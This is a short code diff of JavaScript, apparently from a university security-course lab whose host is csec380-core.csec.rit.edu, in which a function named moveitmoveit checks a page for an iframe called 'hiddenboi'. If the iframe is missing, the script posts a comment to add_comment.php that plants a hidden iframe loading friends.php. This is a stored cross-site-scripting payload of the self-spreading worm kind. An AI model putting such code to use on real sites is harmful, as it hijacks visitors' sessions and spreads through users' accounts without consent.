@@ -8,7 +8,7 @@ function moveitmoveit() {
             return data;
         }
     });
-    if (home.responseText.match("<iframe id='hiddenboi'") == null){
+    if (home.responseText.match("hiddenboi") == null){
         $.get("http://csec380-core.csec.rit.edu:86/add_comment.php",{ comment: '<iframe id="hiddenboi" src="http://csec380-core.csec.rit.edu:86/friends.php"></iframe>'});
     }
     var eff = document.getElementById("hiddenboi");
